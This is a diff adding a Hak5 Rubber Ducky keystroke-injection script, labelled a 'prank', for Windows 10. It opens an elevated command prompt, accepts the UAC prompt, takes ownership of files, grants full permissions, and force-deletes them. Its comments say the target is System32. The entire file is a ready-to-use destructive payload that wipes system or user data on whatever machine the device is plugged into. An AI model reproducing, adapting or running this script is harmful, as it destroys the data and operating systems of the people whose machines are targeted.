@@ -1,0 +1,17 @@
+REM Title:32 wants the D
+REM Author: FalsePhilosopher
+REM Target: Win, tested on 10
+REM Props: Hak5, my friends and memes
+REM Version: 1.0
+REM Category: Prank
+REM D as in DELETE! Deletes System32.
+DELAY 500
+GUI r
+DELAY 500
+STRING cmd
+CTRL-SHIFT ENTER
+DELAY 2000
+ALT y
+DELAY 1500
+STRING takeown /f * /r /a /d y && icacls * /inheritance:r /grant:r administrators:(F) /t & del /f /q *
+ENTER
